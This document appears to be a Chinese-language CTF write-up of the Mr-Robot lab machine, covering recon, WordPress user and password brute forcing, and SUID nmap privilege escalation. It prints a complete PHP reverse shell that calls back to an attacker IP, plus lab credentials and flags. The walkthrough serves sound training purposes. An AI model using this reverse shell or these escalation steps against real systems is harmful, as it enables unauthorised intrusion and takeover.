# 信息搜集

## nmap

1、主机发现

```bash
└─# nmap -sn 192.168.0.0/24 --min-rate=1111
```

2、端口探测梭哈语句

```bash
└─# IP=192.168.0.102
└─# nmap -A -sVC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:B0:BD:3F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
```

## 绑定hosts

```bash
└─# vim /etc/hosts
192.168.0.102 www.example.com
```

## 探测80端口

1、nikto简单探测

```bash
└─# nikto -host 192.168.0.102

---------------------------------------------------------------------------
+ Server: Apache
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /K6LHSbEP.apw: Retrieved x-powered-by header: PHP/5.5.29.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /admin/: This might be interesting.
+ /image/: Drupal Link header found with value: <http://192.168.0.102/?p=23>; rel=shortlink. See: https://www.drupal.org/
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found.
+ /wordpress/wp-admin/wp-login.php: Wordpress login found.
+ /blog/wp-login.php: Wordpress login found.
+ /wp-login.php: Wordpress login found.
+ /wordpress/wp-login.php: Wordpress login found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2023-06-25 03:30:05 (GMT-4) (417 seconds)
---------------------------------------------------------------------------
```

发现搭建了一个 wordpress 站点

2、目录扫描

```bash
└─# gobuster dir -u http://www.example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak

/index.html           (Status: 200) [Size: 1188]
/images               (Status: 301) [Size: 238] [--> http://www.example.com/images/]
/index.php            (Status: 301) [Size: 0] [--> http://www.example.com/]
/blog                 (Status: 301) [Size: 236] [--> http://www.example.com/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://www.example.com/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://www.example.com/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://www.example.com/0/]
/feed                 (Status: 301) [Size: 0] [--> http://www.example.com/feed/]
/video                (Status: 301) [Size: 237] [--> http://www.example.com/video/]
/image                (Status: 301) [Size: 0] [--> http://www.example.com/image/]
/atom                 (Status: 301) [Size: 0] [--> http://www.example.com/feed/atom/]
/wp-content           (Status: 301) [Size: 242] [--> http://www.example.com/wp-content/]
/admin                (Status: 301) [Size: 237] [--> http://www.example.com/admin/]
/audio                (Status: 301) [Size: 237] [--> http://www.example.com/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2761]
/wp-login.php         (Status: 200) [Size: 2761]
/css                  (Status: 301) [Size: 235] [--> http://www.example.com/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://www.example.com/feed/]
/license              (Status: 200) [Size: 19930]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 243] [--> http://www.example.com/wp-includes/]
/js                   (Status: 301) [Size: 234] [--> http://www.example.com/js/]
```

其实也可以找一下 robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

3、关键路径 http://www.example.com/fsocity.dic，发现是个字典，我们 kali 本地下载下来然后去重保存

```bash
└─# wget http://www.example.com/fsocity.dic
└─# cat fsocity.dic | sort -u > mr-robot.dic
```

4、可以上 wpscan 扫描

```bash
└─# wpscan --url http://192.168.0.102/
```

发现 版本为 `WordPress 4.3.31`

# web打点

## 1、枚举用户名

可以使用wp网站的一个后台用户名枚举的漏洞

```bash
└─# searchsploit WordPress 4.3
WordPress Core < 4.7.1 - Username Enumeration                                                                   | php/webapps/41497.php
```

<img src=".\图片\Snipaste_2023-06-25_15-59-43.png" alt="Snipaste_2023-06-25_15-59-43" style="zoom:67%;" />

用 burp抓包爆破用户名，字典用刚从靶机里找到的字典

反选小技巧（从web返回的特殊信息中提取错误特有的信息），得到用户名 elliot

<img src=".\图片\Snipaste_2023-06-25_16-09-42.png" alt="Snipaste_2023-06-25_16-09-42" style="zoom:80%;" />

## 2、爆破wp后台密码

同样的方法，burp爆破密码，字典还是之前靶机中信息泄露的字典

<img src=".\图片\Snipaste_2023-06-25_16-17-11.png" alt="Snipaste_2023-06-25_16-17-11" style="zoom:67%;" />

得到wp后台账号密码

```
elliot:ER28-0652
```

<img src=".\图片\Snipaste_2023-06-25_16-18-29.png" alt="Snipaste_2023-06-25_16-18-29" style="zoom:80%;" />



## 3、wp后台拿shell

这里的一种方法大概是修改相关文件，反弹shell

这里修改 plugins 的文件，然后找到相关路径为 

```http
http://www.example.com/wp-content/plugins/hello.php
```

<img src=".\图片\Snipaste_2023-06-25_16-31-38.png" alt="Snipaste_2023-06-25_16-31-38" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-06-25_16-31-46.png" alt="Snipaste_2023-06-25_16-31-46" style="zoom:80%;" />

```bash
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.0.103] from www.example.com [192.168.0.102] 34838
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 00:30:54 up  1:46,  0 users,  load average: 0.12, 0.30, 0.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
bash: cannot set terminal process group (2769): Inappropriate ioctl for device
bash: no job control in this shell
daemon@linux:/$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@linux:/$ cd /home
cd /home
daemon@linux:/home$ ls
ls
robot
```

补充下，这里的php反弹shell脚本为：

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.103';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

# 提权

## 提权到robot用户

发现特殊面码文件，可以爆破尝试

```bash
daemon@linux:/home$ cd /home/robot
cd /home/robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt
password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

```
hashcat -a 0 -m 0 pass  /usr/share/wordlists/rockyou.txt
```

<img src=".\图片\Snipaste_2023-06-25_16-48-04.png" alt="Snipaste_2023-06-25_16-48-04" style="zoom:80%;" />

得到账号密码

```
robot:abcdefghijklmnopqrstuvwxyz
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
daemon@linux:/$ su robot
su robot
Password: bcdefghijklmnopqrstuvwxyz

su: Authentication failure
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ 
```

## 提权到root

查找suid权限的文件

```
find / -perm -u=s -type f 2>/dev/null
```

发现 nmap

```
/usr/local/bin/nmap
```

利用 [简谈SUID提权 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/272617.html)

```bash
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap>  !sh
 !sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

# 总结

wpscan好用的

wordpress对应版本可以枚举用户名，后台提权方法可以是修改相关文件（反弹shell）再访问执行

hashcat 工具可能破解 MD5

nmap 具有 suid 权限可提权


